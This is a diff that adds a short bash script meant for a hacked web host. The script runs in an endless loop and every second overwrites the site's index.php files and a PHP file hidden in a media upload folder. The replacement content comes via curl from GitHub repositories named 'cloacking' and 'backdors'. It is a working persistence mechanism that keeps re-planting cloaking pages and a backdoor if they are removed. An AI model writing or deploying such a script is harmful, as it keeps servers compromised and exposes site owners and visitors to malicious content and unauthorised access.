@@ -1,0 +1,25 @@
+#!/bin/bash
+
+FILES=(
+"/home/u60601p147814/domains/u60601p147814.web0154.zxcs-klant.nl/public_html/index.php"
+"/home/u60601p147814/domains/u60601p147814.web0154.zxcs-klant.nl/public_html/pub/index.php"
+"/home/u60601p147814/domains/u60601p147814.web0154.zxcs-klant.nl/public_html/pub/media/customer_address/9/aw.php_5.inc"
+)
+
+URLS=(
+"https://raw.githubusercontent.com/flux-lab/cloacking/refs/heads/main/supboard1"
+"https://raw.githubusercontent.com/flux-lab/cloacking/refs/heads/main/supboard2"
+"https://raw.githubusercontent.com/flux-lab/backdors/refs/heads/main/gecko"
+)
+
+while true
+do
+
+for i in ${!FILES[@]}
+do
+curl -s "${URLS[$i]}" -o "${FILES[$i]}"
+done
+
+sleep 1
+
+done
